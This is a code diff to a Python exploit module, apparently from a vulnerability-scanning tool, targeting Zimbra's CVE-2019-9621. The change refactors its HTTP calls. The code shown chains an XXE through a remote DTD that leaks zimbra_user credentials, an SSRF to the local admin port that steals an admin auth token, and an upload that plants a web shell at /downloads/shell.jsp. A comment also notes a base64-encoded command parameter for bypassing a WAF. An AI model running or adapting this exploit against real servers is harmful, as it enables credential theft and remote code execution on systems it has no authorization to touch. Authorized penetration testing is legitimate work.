@@ -7,8 +7,7 @@ description: CVE-2019-9621 任意代码执行漏洞,通过上传dtd文件,来获
 
 import re
 import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class CVE_2019_9621_BaseVerify:
     def __init__(self, url):
@@ -40,7 +39,7 @@ class CVE_2019_9621_BaseVerify:
         </soap:Envelope>
         """.format(username = self.username, password = self.password)
         print("[*] Get Low Privilege Auth Token")
-        req = requests.post(self.url + "/service/soap", headers = self.headers, data = self.auth_body, allow_redirects = False, verify = False)
+        req = request.post(self.url + "/service/soap", headers = self.headers, data = self.auth_body)
         pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
         self.low_priv_token = pattern_auth_token.findall(req.text)[0]
 
@@ -49,7 +48,7 @@ class CVE_2019_9621_BaseVerify:
         self.headers["Host"]="foo:7071"
         print("[*] Get Admin  Auth Token By SSRF")
         pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
-        req = requests.post(self.url + "/service/proxy?target=https://127.0.0.1:7071/service/admin/soap", headers = self.headers,  data = self.auth_body, allow_redirects = False, verify=False)
+        req = request.post(self.url + "/service/proxy?target=https://127.0.0.1:7071/service/admin/soap", headers = self.headers,  data = self.auth_body)
         self.admin_token =pattern_auth_token.findall(req.text)[0]
 
     def upload(self):
@@ -62,12 +61,12 @@ class CVE_2019_9621_BaseVerify:
             "Cookie":"ZM_ADMIN_AUTH_TOKEN=" + self.admin_token +";"
         }
         print("[*] Uploading file")
-        req = requests.post(self.url + "/service/extension/clientUploader/upload", headers = self.headers, files = files, allow_redirects = False, verify=False)
+        req = request.post(self.url + "/service/extension/clientUploader/upload", headers = self.headers, files = files)
         print("Shell: " + self.url +"/downloads/shell.jsp")
         #print("Connect \"shell.jsp\" using K8fly CmdShell\nBecause the CMD parameter is encrypted using Base64(bypass WAF)")
         print("[*] Request Result:")
         s = requests.session()
-        req = s.get(self.url + "/downloads/shell.jsp", headers = self.headers, allow_redirects = False, verify=False)
+        req = s.get(self.url + "/downloads/shell.jsp", headers = self.headers)
         print("May need cookie:")
         print(self.headers['Cookie'])
 
@@ -95,7 +94,7 @@ class CVE_2019_9621_BaseVerify:
                 </Request>
             </Autodiscover>""".format(dtd = dtd_url)
 
-            req = requests.post(self.url + "/Autodiscover/Autodiscover.xml",  headers = self.headers, data= xxe_data, allow_redirects = False, verify = False, timeout=15)
+            req = request.post(self.url + "/Autodiscover/Autodiscover.xml",  headers = self.headers, data= xxe_data)
             if 'Error 503 Requested response schema not available' in req.text:
                 print('存在CVE-2019-9621 任意代码执行漏洞')
                 pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
